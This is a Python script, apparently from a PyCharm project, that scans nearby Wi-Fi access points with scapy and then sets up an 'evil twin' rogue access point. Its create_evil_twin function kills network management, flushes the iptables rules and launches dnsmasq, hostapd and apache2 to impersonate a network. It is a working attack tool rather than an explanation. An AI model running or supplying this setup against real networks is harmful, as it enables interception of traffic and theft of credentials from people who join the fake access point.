import os
import time

import pandas as pd
from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11
from scapy.sendrecv import sniff

# initialize the networks dataframe that will contain all access points nearby
networks = pd.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)
interface = 'wlxc4e9841e1a74'


def run_script():
    os.system(f"sudo ip link set {interface} down")
    os.system(f"sudo iw {interface} set type monitor")
    os.system(f"sudo ip link set {interface} up")


def set_interface():
    # interface name, check using iwconfig
    # global interface
    # os.system("iwconfig")
    # interface = input("Enter interface to turn into monitor mode: ")
    run_script()


def search_for_networks(timeout: int = 60):
    def scanning(packet):
        if packet.haslayer(Dot11Beacon):
            # extract the MAC address of the network
            bssid = packet[Dot11].addr2
            # get the name of it
            ssid = packet[Dot11Elt].info.decode()
            try:
                dbm_signal = packet.dBm_AntSignal
            except:
                dbm_signal = "N/A"
            # extract network stats
            stats = packet[Dot11Beacon].network_stats()
            # get the channel of the AP
            channel = stats.get("channel")
            # get the crypto
            crypto = stats.get("crypto")
            networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)
            os.system("clear")
            print("scanning for networks...")
            print(networks)
            time.sleep(0.5)

    sniff(prn=scanning, iface=interface, timeout=timeout)


def create_evil_twin():
    print('stopping network manager...')
    os.system('systemctl stop NetworkManager')
    print('killing unnecessary processes...')
    os.system('airmon-ng check kill')

    os.system(f'ifconfig {interface} 10.0.0.1 netmask 255.255.255.0')
    os.system('route add default gw 10.0.0.1')

    os.system('iptables --flush')
    os.system('iptables --table nat --flush')
    os.system('iptables --delete-chain')
    os.system('iptables --table nat --delete-chain')
    os.system('iptables -P FORWARD ACCEPT')

    print('activate dnsmasq...')
    os.system('dnsmasq -C ./dnsmasq.conf')

    print('activate hostapd...')
    os.system('hostapd ./hostpad.conf -B')
    print("activate apache2")
    os.system('service apache2 start')


def stop_attack():
    os.system("service hostapd stop")
    os.system("service apache2 stop")
    os.system("service dnsmasq stop")
    os.system("killall dnsmasq")
    os.system("killall hostapd")
    os.system("systemctl start NetworkManager")


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    stop_attack()
    set_interface()
    # search_for_networks()
    create_evil_twin()



# See PyCharm help at https://www.jetbrains.com/help/pycharm/
